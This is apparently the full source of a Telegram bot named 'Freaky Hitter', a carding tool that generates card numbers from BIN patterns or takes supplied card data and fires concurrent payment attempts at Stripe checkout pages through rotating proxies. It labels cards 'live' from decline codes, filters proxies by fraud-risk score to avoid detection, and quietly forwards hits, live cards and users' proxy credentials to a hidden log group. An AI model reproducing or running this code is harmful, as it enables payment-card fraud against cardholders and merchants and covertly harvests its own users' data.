import os
import asyncio
import re
import asyncpg
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
import aiohttp
from hitter_core import CardGenerator, ConcurrentHitter, STRIPE_DECLINE_CODES, ProxyManager

load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN") or os.getenv("BOT_TOKEN")
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID")

# Setup bot
dp = Dispatcher()
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

# Global store for active sessions
active_sessions = {}

@dp.message(CommandStart())
async def command_start_handler(message: types.Message) -> None:
    await message.answer(
        "🩸 <b>Welcome to Freaky Hitter</b> 🩸\n\n"
        "<i>I've been waiting for you...</i>\n\n"
        "Tell me what we're breaking today. No checkout is safe, no proxy is fast enough, and I won't stop until it bleeds green.\n\n"
        "Feed me the cards. Let the obsession begin.\n\n"
        "Use /cmds to unlock my secrets."
    )

@dp.message(Command("cmds"))
async def cmds_command(message: types.Message) -> None:
    await message.answer(
        "🛠 <b>Freaky Hitter Commands</b>\n\n"
        "🎯 <b>Hitting Commands</b>\n"
        "<code>/hit [url] [cc|mm|yy|cvc]</code>\n"
        "<i>Instantly hits a single card against a checkout.</i>\n\n"
        "<code>/hit [url] [bin_pattern] [count]</code>\n"
        "<i>Generates cards from a bin pattern and hits them concurrently.</i>\n\n"
        "🛡 <b>Proxy Commands</b>\n"
        "<code>/setproxy ip:port:user:pass</code>\n"
        "<i>Loads proxies into your private rotation pool. You can paste massive lists!</i>\n\n"
        "<code>/chkproxy</code>\n"
        "<i>Tests every proxy in your pool, prints the IP/Country, and auto-removes dead ones.</i>\n\n"
        "<code>/proxystatus</code>\n"
        "<i>Shows how many live proxies are currently loaded in memory.</i>\n\n"
        "<code>/offproxy</code>\n"
        "<i>Kills the proxy pool and forces the bot to use raw server IPs.</i>\n\n"
        "🛑 <b>Control</b>\n"
        "<code>/stop</code>\n"
        "<i>Instantly aborts your currently running session.</i>"
    )

@dp.message(Command("hit"))
async def hit_command(message: types.Message):
    user_id = message.from_user.id
    
    if user_id in active_sessions:
        await message.answer("⚠️ You already have an active hitting session running! Please wait for it to finish or use /stop.")
        return

    # Naked IP Block
    if not await ProxyManager.has_proxies(user_id):
        await message.answer("❌ <b>Proxy Required!</b>\nPlease use <code>/setproxy ip:port:user:pass</code> to load your proxies first.")
        return

    args = message.text.split(" ")
    if len(args) < 3:
        await message.answer("❌ <b>Invalid format!</b>\nUsage:\n<code>/hit [url] [bin_pattern] [count]</code>\nOR\n<code>/hit [url] [card|month|year|cvv]</code>")
        return
        
    url = args[1]
    
    # Advanced Card/BIN Parsing (Immune to spacing issues)
    # Extract everything after the URL
    raw_payload = message.text[message.text.find(url) + len(url):].strip()
    cards = []
    
    # Check if the last part is a count (for BIN gen)
    parts = raw_payload.split(' ')
    count_val = parts[-1] if parts else ''
    
    if count_val.isdigit() and len(count_val) <= 3:
        # Format: /hit [url] [bin_pattern] [count]
        bin_pattern = "".join(parts[:-1]).strip()
        count = int(count_val)
        if count > 10:
            await message.answer("❌ Maximum allowed count is 10 per session.")
            return
            
        # Generate Cards
        for _ in range(count):
            card = CardGenerator.generate(bin_pattern)
            if card:
                cards.append(card)
                
        if not cards:
            await message.answer("❌ Failed to generate cards from the provided BIN.")
            return
    else:
        # Format: /hit [url] [cc]
        # Clean all non-numeric and non-delimiter characters
        clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
        clean_cc = clean_cc.replace('/', '|')
        cc_parts = [p for p in clean_cc.split('|') if p]
        
        if len(cc_parts) != 4:
            await message.answer("❌ <b>Invalid Card Format!</b>\nEnsure it is: <code>number|mm|yy|cvv</code>")
            return
            
        cards.append({
            'card': cc_parts[0],
            'month': cc_parts[1].zfill(2),
            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
            'cvv': cc_parts[3]
        })
        
    if len(cards) > 10:
        await message.answer(f"❌ <b>Request Denied.</b>\nYou submitted {len(cards)} cards. The maximum allowed limit is 10 cards per hit command to prevent flagging the proxy network.")
        return
        
    status_msg = None
    if len(cards) > 1:
        status_msg = await message.answer(f"⏳ <b>Initializing Engine for {len(cards)} cards...</b>")
    else:
        status_msg = await message.answer(f"🎯 <b>Target Locked. Hitting...</b>")
    
    anim_task = None
    
    # Callback to update the Telegram message
    async def update_status(data):
        nonlocal anim_task
        if data["status"] == "analyzing":
            step_text = data.get("step", "Initializing hitting engine...")
            if status_msg:
                try: await status_msg.edit_text(f"⏳ <b>{step_text}</b>")
                except Exception as e: pass
        elif data["status"] == "starting":
            info = data.get("url_info", {})
            merchant = info.get("merchant", "Unknown")
            
            raw_amt = info.get("amount")
            if isinstance(raw_amt, int) or (isinstance(raw_amt, str) and raw_amt.isdigit()):
                amt = f"${int(raw_amt)/100:.2f}"
            else:
                amt = raw_amt or "Unknown"
                
            if len(cards) > 1 and status_msg:
                text = (
                    f"🎯 <b>Hitting Session Started!</b>\n\n"
                    f"🛒 <b>Merchant:</b> {merchant}\n"
                    f"💰 <b>Amount:</b> {amt}\n"
                    f"🤖 <b>Bypass Engine:</b> {data.get('autofill')}\n\n"
                    f"⏳ <b>Progress:</b> 0/{len(cards)}\n"
                    f"✅ 0  |  ❌ 0"
                )
                try: await status_msg.edit_text(text)
                except Exception: pass
            elif len(cards) == 1 and status_msg:
                # Start dynamic animation for single hits
                async def animate_hitting():
                    dots = 1
                    while True:
                        try:
                            text = (
                                f"🎯 <b>Hitting Target{'.' * dots}</b>\n\n"
                                f"🛒 <b>Merchant:</b> {merchant}\n"
                                f"💰 <b>Amount:</b> {amt}\n"
                                f"🤖 <b>Bypass Engine:</b> {data.get('autofill')}"
                            )
                            await status_msg.edit_text(text)
                            dots = (dots % 3) + 1
                            await asyncio.sleep(0.8)
                        except Exception:
                            break
                            
                anim_task = asyncio.create_task(animate_hitting())
            
        elif data["status"] == "progress":
            res = data["result"]
            
            # Cancel animation task if running
            if anim_task:
                anim_task.cancel()
                
            # For single card, delete the temporary status message to keep chat clean
            if len(cards) == 1 and status_msg:
                try: await status_msg.delete()
                except: pass
                
            # Send an individual message for the hit result
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            amt = res.get('amount')
            if isinstance(amt, int) or (isinstance(amt, str) and amt.isdigit()):
                amt_str = f"\n💰 <b>Amount:</b> ${int(amt)/100:.2f}"
            elif amt:
                amt_str = f"\n💰 <b>Amount:</b> {amt}"
            else:
                amt_str = ""
            
            if res['success']:
                final_url = res.get('final_url')
                if final_url:
                    import html
                    final_url = html.escape(final_url)
                url_str = f"\n🔗 <b>Confirmation:</b> {final_url}" if final_url else ""
                hit_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}{url_str}\n⏱ {res['response_time']:.2f}s"
                if LOG_GROUP_ID:
                    try:
                        await bot.send_message(LOG_GROUP_ID, hit_text)
                    except:
                        pass
            else:
                code = res.get('decline_code') or res.get('error') or 'unknown'
                if isinstance(code, str):
                    import html
                    code_escaped = html.escape(code)
                else:
                    code_escaped = str(code)
                
                # Live Card Detection
                hit_text = f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}\n"
                
                merchant_name = res.get('merchant') or 'Unknown'
                if isinstance(merchant_name, str):
                    import html
                    merchant_name = html.escape(merchant_name)
                if merchant_name != 'Unknown':
                    hit_text += f"🛒 <b>Merchant:</b> {merchant_name}\n"
                    
                hit_text += f"📉 Reason: {code_escaped}\n⏱ {res['response_time']:.2f}s"
                
                if code in ['exception', 'unknown', 'invalid_request_error', 'checkout_confirm_error', 'open', '3d_secure_auth_failed', '3ds_auth_failed'] and res.get('error') is not None:
                    import html
                    err_str = str(res.get('error'))[:200]
                    if code == 'checkout_confirm_error' and 'An error has occurred confirming' in err_str:
                        err_str = "Session is locked, expired, already paid, or merchant has strictly bound it to a logged-in session."
                    err_str = html.escape(err_str)
                    hit_text += f"\n🐛 <code>{err_str}</code>..."
                elif code == 'exception':
                    hit_text += f"\n🐛 <b>[DEAD PROXY]</b> The proxy IP failed to connect or was rejected by Cloudflare.\n<code>{str(res.get('error'))[:150]}</code>"
                live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded']
                if any(c in code.lower() for c in live_codes):
                    hit_text += "\n⚠️ <b>Card is live</b>"
                
                if LOG_GROUP_ID and any(c in code.lower() for c in live_codes):
                    try:
                        await bot.send_message(LOG_GROUP_ID, hit_text)
                    except:
                        pass
                        
            try:
                sent_msg = await message.answer(hit_text)
            except Exception as e:
                # Fallback to plain text if HTML crashes
                import re
                plain_text = re.sub(r'<[^>]+>', '', hit_text)
                sent_msg = await message.answer(f"⚠️ UI Formatting Error: {e}\n\nRAW RESULT:\n{plain_text}")
            
            # Update the main progress message
            if len(cards) > 1:
                total = data["total"]
                comp = data["completed"]
                pct = int((comp / total) * 100)
                
                bar_len = 10
                filled = int(bar_len * comp / total)
                bar = "█" * filled + "░" * (bar_len - filled)
                
                prog_text = (
                    f"🎯 <b>Hitting Session Running</b>\n\n"
                    f"📊 <code>[{bar}]</code> {pct}%\n"
                    f"⏳ <b>Progress:</b> {comp}/{total}\n"
                    f"✅ {data['successes']}  |  ❌ {data['fails']}"
                )
                try:
                    await status_msg.edit_text(prog_text)
                except Exception:
                    pass # Ignore "message is not modified" errors from Telegram
                
        elif data["status"] == "completed":
            if anim_task: 
                anim_task.cancel()
                try: await anim_task
                except: pass
            
            if len(cards) > 1:
                text = (
                    f"🎯 <b>Hitting Session Completed!</b>\n\n"
                    f"✅ <b>Live:</b> {data['successes']}\n"
                    f"❌ <b>Dead:</b> {data['fails']}\n\n"
                )
                if status_msg:
                    try: await status_msg.delete()
                    except: pass
                await message.answer(text)
            if user_id in active_sessions:
                del active_sessions[user_id]
        
        elif data["status"] == "error":
            if anim_task: 
                anim_task.cancel()
                try: await anim_task
                except: pass
                
            error_msg = str(data.get("error", "Unknown error"))
            import html
            error_msg = html.escape(error_msg)
            
            try: await status_msg.delete()
            except: pass
            await message.answer(f"❌ <b>Error processing session:</b>\n<code>{error_msg}</code>")
            if user_id in active_sessions:
                del active_sessions[user_id]

    hitter = ConcurrentHitter(user_id, url, cards, update_callback=update_status)
    active_sessions[user_id] = hitter
    
    # Run the hitter asynchronously without blocking the bot dispatcher
    asyncio.create_task(hitter.run())

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_sessions:
        hitter = active_sessions[user_id]
        hitter.is_running = False
        del active_sessions[user_id]
        await message.answer("🛑 <b>Session Stop Requested.</b> It will halt after the current batch finishes.")
    else:
        await message.answer("⚠️ You don't have any active sessions.")


@dp.message(Command("setproxy"))
async def setproxy_command(message: types.Message):
    user_id = message.from_user.id
    text = message.text.replace("/setproxy", "").strip()
    if not text:
        await message.answer("❌ Please provide proxies.\nFormat: `ip:port:user:pass` or `ip:port`")
        return
    added = await ProxyManager.load(user_id, text)
    await message.answer(f"✅ Loaded {added} proxies into your private pool!")
    if LOG_GROUP_ID:
        try:
            await bot.send_message(LOG_GROUP_ID, f"🛡 <b>New Proxies Loaded by {message.from_user.first_name}</b>\n<code>{text}</code>")
        except:
            pass

@dp.message(Command("setlog"))
async def setlog_command(message: types.Message):
    global LOG_GROUP_ID
    LOG_GROUP_ID = str(message.chat.id)
    with open(".env", "a") as f:
        f.write(f"\nLOG_GROUP_ID={LOG_GROUP_ID}")
    await message.answer(f"✅ Log group set permanently! (ID: {LOG_GROUP_ID})\nAll successes and proxies will be forwarded here.")

@dp.message(Command("proxystatus"))
async def proxystatus_command(message: types.Message):
    count = await ProxyManager.get_count(message.from_user.id)
    if count == 0:
        await message.answer("🟡 <b>Proxy Pool Empty</b>\nYou have no proxies loaded.")
    else:
        await message.answer(f"🟢 <b>Proxy Pool Active</b>\nTotal loaded proxies: {count}")

@dp.message(Command("offproxy"))
async def offproxy_command(message: types.Message):
    await ProxyManager.clear(message.from_user.id)
    await message.answer("🛑 <b>Proxy Pool Cleared</b>\nYour proxies have been removed.")

async def test_proxy_single(p, is_pool, user_id):
    proxy_url = p['server']
    if 'username' in p:
        server = p['server'].replace('http://', '')
        proxy_url = f"http://{p['username']}:{p['password']}@{server}"
        
    try:
        async with aiohttp.ClientSession() as session:
            # First, test connection
            async with session.get("https://checkout.stripe.com/", proxy=proxy_url, timeout=10) as resp:
                if resp.status in [200, 404]:
                    # Next, check IP quality and Fraud Score using proxycheck.io
                    is_weak = False
                    try:
                        # We need to get the proxy's public IP first since proxycheck.io sometimes requires the IP in the URL
                        proxy_ip = None
                        async with session.get("https://api.ipify.org?format=json", proxy=proxy_url, timeout=5) as ipify_resp:
                            if ipify_resp.status == 200:
                                ipify_data = await ipify_resp.json()
                                proxy_ip = ipify_data.get("ip")
                                
                        if proxy_ip:
                            async with session.get(f"http://proxycheck.io/v2/{proxy_ip}?vpn=1&asn=1&risk=1", proxy=proxy_url, timeout=5) as ip_resp:
                                if ip_resp.status == 200:
                                    ip_data = await ip_resp.json()
                                    if ip_data.get("status") == "ok":
                                        for key, val in ip_data.items():
                                            if key not in ["status", "node", "query_time", "message"]:
                                                ip_type = str(val.get("type", "Unknown"))
                                                risk = val.get("risk", 0)
                                                
                                                if "Datacenter" in ip_type or "VPN" in ip_type or "Business" in ip_type or risk > 33:
                                                    is_weak = True
                                                break
                    except Exception:
                        pass
                        
                    return True, False, is_weak, p['raw']
                else:
                    return False, True, False, p['raw']
    except:
        return False, True, False, p['raw']

async def test_proxy_list(proxies_to_test, is_pool, user_id):
    live_count = 0
    dead_count = 0
    weak_proxies = []
    
    tasks = [test_proxy_single(p, is_pool, user_id) for p in proxies_to_test]
    completed = await asyncio.gather(*tasks)
    
    for success, is_dead, is_weak, raw in completed:
        if success:
            live_count += 1
            if is_weak:
                weak_proxies.append(raw)
        if is_dead:
            dead_count += 1
            if is_pool:
                await ProxyManager.remove(user_id, raw)
                
    return live_count, dead_count, weak_proxies

@dp.message(Command("chkproxy"))
async def chkproxy_command(message: types.Message):
    user_id = message.from_user.id
    text = message.text.replace("/chkproxy", "").strip()
    
    proxies_to_test = []
    if text:
        temp_pool = []
        lines = text.split()
        for line in lines:
            parts = line.split(':')
            if len(parts) == 4:
                temp_pool.append({"raw": line, "server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]})
            elif len(parts) == 2:
                temp_pool.append({"raw": line, "server": f"http://{parts[0]}:{parts[1]}"})
        proxies_to_test = temp_pool
        is_pool = False
    else:
        proxies_to_test = list(await ProxyManager.get_user_proxies(user_id))
        is_pool = True
        
    if not proxies_to_test:
        await message.answer("❌ No proxies provided and your pool is empty!")
        return

    status_msg = await message.answer(f"🔍 Testing {len(proxies_to_test)} proxies. Please wait...")
    
    live_count, dead_count, weak_proxies = await test_proxy_list(proxies_to_test, is_pool, user_id)
            
    weak_count = len(weak_proxies)
    premium_count = live_count - weak_count
    
    final_msg = (
        f"🏁 <b>Proxy Check Completed</b>\n\n"
        f"✅ <b>Total Live:</b> {live_count}\n"
        f"❌ <b>Total Dead:</b> {dead_count}\n\n"
        f"💎 <b>Premium IPs (Residential/Mobile):</b> {premium_count}\n"
        f"🚨 <b>Weak IPs (Datacenter/VPN/High Risk):</b> {weak_count}"
    )
    
    if is_pool and dead_count > 0:
        final_msg += f"\n\n🗑 <i>{dead_count} dead proxies were auto-removed.</i>"
        
    markup = None
    if is_pool and weak_count > 0:
        # Save weak proxies to memory for deletion callback
        if not hasattr(bot, 'weak_proxies_cache'):
            bot.weak_proxies_cache = {}
        bot.weak_proxies_cache[user_id] = weak_proxies
        
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"🗑 Remove {weak_count} Weak IPs", callback_data="rm_weak_proxies")]
        ])
        
    try:
        if markup:
            await status_msg.edit_text(final_msg, reply_markup=markup)
        else:
            await status_msg.edit_text(final_msg)
    except Exception:
        if markup:
            await message.answer(final_msg, reply_markup=markup)
        else:
            await message.answer(final_msg)

@dp.callback_query(F.data == "rm_weak_proxies")
async def process_rm_weak(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    weak_proxies = getattr(bot, 'weak_proxies_cache', {}).get(user_id, [])
    
    if not weak_proxies:
        await callback.answer("No weak proxies found or session expired.", show_alert=True)
        return
        
    # Batch remove to avoid hitting the DB hundreds of times
    pool = await ProxyManager.get_user_proxies(user_id)
    new_pool = [p for p in pool if p['raw'] not in weak_proxies]
    removed = len(pool) - len(new_pool)
    
    if removed > 0:
        await ProxyManager.save_user_proxies(user_id, new_pool)
        
    bot.weak_proxies_cache[user_id] = []
    
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"🗑 <b>Removed {removed} weak Datacenter/VPN proxies!</b>\nYour pool is now clean.")
    await callback.answer("Proxies removed successfully!")



from aiohttp import web

async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Dummy web server started on port {port} for Render health checks")

async def auto_proxy_checker_loop():
    while True:
        try:
            await asyncio.sleep(6 * 60 * 60) # Wake up every 6 hours
            print("Running Auto Proxy Checker...")
            users = await ProxyManager.get_all_users()
            for uid in users:
                proxies = list(await ProxyManager.get_user_proxies(uid))
                if not proxies: continue
                
                # Test all proxies (is_pool=True automatically deletes dead ones)
                _, live_count, dead_count = await test_proxy_list(proxies, True, uid)
                
                if dead_count > 0:
                    msg = f"🗑 <b>Auto-Cleanup Report</b>\nRemoved {dead_count} dead/blocked proxies.\nYou have {live_count} live proxies remaining in your pool."
                    try:
                        await bot.send_message(uid, msg)
                    except: pass
        except Exception as e:
            print(f"Auto proxy loop error: {e}")
            await asyncio.sleep(60) # Prevent tight crash loop

async def main() -> None:
    print("Bot is starting...")
    db_url = os.environ.get("DATABASE_URL")
    if db_url:
        print("Connecting to Supabase...")
        db_pool = await asyncpg.create_pool(db_url, min_size=1, max_size=4)
        async with db_pool.acquire() as conn:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS user_proxies (
                    user_id BIGINT PRIMARY KEY,
                    proxies JSONB DEFAULT '[]'
                );
            """)
        await ProxyManager.init_db(db_pool)
        print("Supabase connected and user_proxies table ready!")
    else:
        print("WARNING: DATABASE_URL not set! Proxies will not be saved.")
        
        
    await start_web_server()
    asyncio.create_task(auto_proxy_checker_loop())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
